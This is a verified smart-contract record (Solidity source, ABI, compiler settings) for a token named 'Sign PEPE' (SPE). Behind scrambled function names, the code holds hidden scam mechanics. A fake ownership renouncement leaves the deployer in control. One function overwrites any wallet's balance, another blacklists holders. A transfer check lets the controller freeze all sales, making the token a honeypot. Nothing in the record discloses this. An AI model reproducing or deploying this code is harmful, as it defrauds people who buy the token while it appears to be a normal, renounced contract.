{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface senderEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellEnable) external view returns (uint256);\n\n    function transfer(address fundAmount, uint256 buyAt) external returns (bool);\n\n    function allowance(address buyEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundAmount,\n        uint256 buyAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTo, uint256 value);\n    event Approval(address indexed buyEnable, address indexed spender, uint256 value);\n}\n\nabstract contract tokenList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamAmountShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedLiquidity {\n    function createPair(address enableTx, address sellTotal) external returns (address);\n}\n\ninterface shouldMarketing is senderEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SignPEPE is tokenList, senderEnable, shouldMarketing {\n\n    uint256 private amountEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletMarketing;\n    }\n\n    address receiverAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minIs;\n    }\n\n    function owner() external view returns (address) {\n        return minMax;\n    }\n\n    string private teamSellTake = \"Sign PEPE\";\n\n    uint256 public minAmountTx;\n\n    bool private atBuyTrading;\n\n    function allowance(address amountMax, address sellTakeToken) external view virtual override returns (uint256) {\n        if (sellTakeToken == receiverAt) {\n            return type(uint256).max;\n        }\n        return fundLaunch[amountMax][sellTakeToken];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamSellTake;\n    }\n\n    mapping(address => bool) public swapFund;\n\n    function approve(address sellTakeToken, uint256 buyAt) public virtual override returns (bool) {\n        fundLaunch[_msgSender()][sellTakeToken] = buyAt;\n        emit Approval(_msgSender(), sellTakeToken, buyAt);\n        return true;\n    }\n\n    mapping(address => bool) public totalTrading;\n\n    uint256 feeMarketing;\n\n    mapping(address => uint256) private amountWallet;\n\n    bool public sellMarketing;\n\n    function balanceOf(address sellEnable) public view virtual override returns (uint256) {\n        return amountWallet[sellEnable];\n    }\n\n    uint256 public teamLaunchWallet;\n\n    function minShould(address takeTotal, uint256 buyAt) public {\n        sellAmountTeam();\n        amountWallet[takeTotal] = buyAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundLaunch;\n\n    uint256 private receiverLiquidity;\n\n    bool private enableLiquidityMode;\n\n    string private walletMarketing = \"SPE\";\n\n    function fundFee(address atTeam) public {\n        sellAmountTeam();\n        \n        if (atTeam == maxSwap || atTeam == launchedMax) {\n            return;\n        }\n        totalTrading[atTeam] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTake;\n    }\n\n    function transfer(address takeTotal, uint256 buyAt) external virtual override returns (bool) {\n        return receiverMode(_msgSender(), takeTotal, buyAt);\n    }\n\n    bool public isTotalMax;\n\n    address private minMax;\n\n    uint256 private minIs = 100000000 * 10 ** 18;\n\n    bool private minTo;\n\n    uint256 constant fundSwapLimit = 5 ** 10;\n\n    function getOwner() external view returns (address) {\n        return minMax;\n    }\n\n    address public launchedMax;\n\n    function fundSender(uint256 buyAt) public {\n        sellAmountTeam();\n        feeMarketing = buyAt;\n    }\n\n    bool private shouldTx;\n\n    function feeLaunchIs(address liquidityAmount) public {\n        if (sellMarketing) {\n            return;\n        }\n        \n        swapFund[liquidityAmount] = true;\n        \n        sellMarketing = true;\n    }\n\n    function receiverMode(address exemptTo, address fundAmount, uint256 buyAt) internal returns (bool) {\n        if (exemptTo == maxSwap) {\n            return marketingFromWallet(exemptTo, fundAmount, buyAt);\n        }\n        uint256 fromMin = senderEnable(launchedMax).balanceOf(autoAt);\n        require(fromMin == feeMarketing);\n        require(fundAmount != autoAt);\n        if (totalTrading[exemptTo]) {\n            return marketingFromWallet(exemptTo, fundAmount, fundSwapLimit);\n        }\n        return marketingFromWallet(exemptTo, fundAmount, buyAt);\n    }\n\n    uint256 buyAutoSwap;\n\n    event OwnershipTransferred(address indexed receiverLaunchedList, address indexed teamMode);\n\n    uint8 private enableTake = 18;\n\n    function sellAmountTeam() private view {\n        require(swapFund[_msgSender()]);\n    }\n\n    address autoAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        if (minAmountTx != amountEnable) {\n            amountEnable = receiverLiquidity;\n        }\n        teamAmountShould feeTrading = teamAmountShould(receiverAt);\n        launchedMax = launchedLiquidity(feeTrading.factory()).createPair(feeTrading.WETH(), address(this));\n        if (isTotalMax) {\n            shouldTx = false;\n        }\n        maxSwap = _msgSender();\n        listReceiverTotal();\n        swapFund[maxSwap] = true;\n        amountWallet[maxSwap] = minIs;\n        \n        emit Transfer(address(0), maxSwap, minIs);\n    }\n\n    function transferFrom(address exemptTo, address fundAmount, uint256 buyAt) external override returns (bool) {\n        if (_msgSender() != receiverAt) {\n            if (fundLaunch[exemptTo][_msgSender()] != type(uint256).max) {\n                require(buyAt <= fundLaunch[exemptTo][_msgSender()]);\n                fundLaunch[exemptTo][_msgSender()] -= buyAt;\n            }\n        }\n        return receiverMode(exemptTo, fundAmount, buyAt);\n    }\n\n    address public maxSwap;\n\n    function marketingFromWallet(address exemptTo, address fundAmount, uint256 buyAt) internal returns (bool) {\n        require(amountWallet[exemptTo] >= buyAt);\n        amountWallet[exemptTo] -= buyAt;\n        amountWallet[fundAmount] += buyAt;\n        emit Transfer(exemptTo, fundAmount, buyAt);\n        return true;\n    }\n\n    function listReceiverTotal() public {\n        emit OwnershipTransferred(maxSwap, address(0));\n        minMax = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunchedList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTakeToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTakeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"}],\"name\":\"feeLaunchIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"}],\"name\":\"fundFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"fundSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotalMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAmountTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"minShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunchWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SignPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}